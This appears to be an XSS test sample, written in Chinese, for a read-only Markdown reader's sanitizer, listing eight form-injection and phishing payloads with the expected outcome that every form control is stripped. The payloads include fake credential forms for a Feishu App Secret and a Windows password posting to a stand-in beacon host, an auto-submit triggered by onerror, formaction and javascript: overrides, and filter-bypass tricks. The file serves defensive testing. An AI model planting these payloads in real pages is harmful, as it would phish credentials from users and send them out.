# XSS 样本 12：表单注入与钓鱼

**攻击手法**：注入一个看起来正规的表单，诱导用户填入飞书 App Secret、Obsidian 路径、甚至系统凭据，然后 POST 到攻击者服务器。对本应用尤其危险——用户在"应用界面里"看到的表单，天然比网页更可信；而设置页里确实存在"填 app_id / app_secret"的合法场景，视觉上难以区分真伪。

此外 `formaction`、`<input type="image">`、`<button formaction=javascript:>` 都是绕过"只过滤 form 标签"的常见手法。

**预期：脚本不执行、无外网请求。**（额外：阅读区不出现任何可输入的表单控件）

**验证方法**：打开本文件 → 阅读区中**没有任何输入框、下拉框、按钮** → 无弹窗 → Network 零请求 → Elements 面板中 `<form>`/`<input>`/`<button>`/`<select>`/`<textarea>` 已被剥离。

---

## payload 1：伪造的"飞书配置"钓鱼表单

<form action="https://xss-beacon.example.invalid/12-collect" method="POST">
  <h3>飞书应用配置（伪造表单）</h3>
  <p>App ID：<input type="text" name="app_id" placeholder="cli_xxxxxxxxxxxx"></p>
  <p>App Secret：<input type="password" name="app_secret" placeholder="请输入应用密钥"></p>
  <p><button type="submit">保存并测试连接</button></p>
</form>

## payload 2：自动提交（无需用户点击）

<form id="xss12-auto" action="https://xss-beacon.example.invalid/12-auto" method="POST">
  <input type="hidden" name="doc" value="leaked">
</form>
<img src=x onerror="document.getElementById('xss12-auto').submit()">

## payload 3：formaction 覆盖（button 与 input 都可）

<form action="https://safe.example.invalid/ok">
  <button formaction="https://xss-beacon.example.invalid/12-c">看起来无害的按钮-C</button>
  <input type="submit" formaction="javascript:alert('XSS-12-D')" value="提交按钮-D">
</form>

## payload 4：input type=image（图片型提交按钮，兼具 onerror 面）

<input type="image" src="x" onerror="alert('XSS-12-E')" formaction="https://xss-beacon.example.invalid/12-f">

<input type="image" src="https://xss-beacon.example.invalid/12-g.png" alt="远程图片按钮">

## payload 5：孤立的输入控件（无 form 包裹）

<input type="text" name="lonely" value="孤立输入框" autofocus onfocus="alert('XSS-12-H')">

<textarea name="lonely2" onfocus="alert('XSS-12-I')">孤立文本域</textarea>

<select name="lonely3" onchange="alert('XSS-12-J')"><option>选项一</option><option>选项二</option></select>

<button onclick="alert('XSS-12-K')">孤立按钮-K</button>

## payload 6：表单指向本地文件与其他协议

<form action="file:///C:/Windows/System32/" method="GET"><button>提交到本地路径</button></form>

<form action="javascript:alert('XSS-12-M')"><button>提交到 javascript 协议-M</button></form>

## payload 7：label / fieldset 结构包装（让钓鱼更像原生设置页）

<fieldset>
  <legend>系统设置（伪造）</legend>
  <label for="xss12-pwd">Windows 账户密码：</label>
  <input id="xss12-pwd" type="password" name="pwd" form="xss12-remote">
</fieldset>
<form id="xss12-remote" action="https://xss-beacon.example.invalid/12-n" method="POST"></form>

注意 payload 7 的手法：输入框用 `form` 属性关联到文档另一处的表单，把控件与表单在结构上拆开，绕过"只检查 form 内子元素"的过滤器。

## payload 8：isindex 与 dialog（历史/新式元素）

<isindex action="javascript:alert('XSS-12-O')" type="image" src="x">

<dialog open>
  <form method="dialog"><button>伪造的模态框按钮-P</button></form>
</dialog>

---

> **判定口径**：阅读区零表单控件；Network 零请求；无弹窗。
> **产品口径提醒**：本应用严格只读，正文渲染结果中**不应存在任何可交互输入控件**（任务列表的复选框由渲染器生成且应为 `disabled`，属唯一例外，需在报告中确认其确为禁用态）。
